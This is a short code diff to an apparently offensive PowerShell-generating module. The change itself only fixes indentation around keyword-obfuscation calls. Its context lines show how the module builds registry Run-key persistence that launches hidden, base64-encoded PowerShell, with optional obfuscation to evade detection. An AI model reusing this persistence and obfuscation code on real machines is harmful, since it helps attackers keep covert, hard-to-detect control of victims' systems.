@@ -156,8 +156,9 @@ class Module(object):
             
             script += "Remove-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ -Name " + keyName + ";"
             script += "'Registry Persistence removed.'"
-                script = helpers.keyword_obfuscation(script, self.mainMenu)
+            script = helpers.keyword_obfuscation(script, self.mainMenu)
         if obfuscate:
+
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script,
                                            obfuscationCommand=obfuscationCommand)
             return script
@@ -245,8 +246,9 @@ class Module(object):
         script += "$null=Set-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ -Name " + keyName + " -Value '\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x=" + locationString + ";powershell -Win Hidden -enc $x\"';"
         
         script += "'Registry persistence established " + statusMsg + "'"
-            script = helpers.keyword_obfuscation(script, self.mainMenu)
+        script = helpers.keyword_obfuscation(script, self.mainMenu)
         if obfuscate:
+
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script,
                                        obfuscationCommand=obfuscationCommand)
 
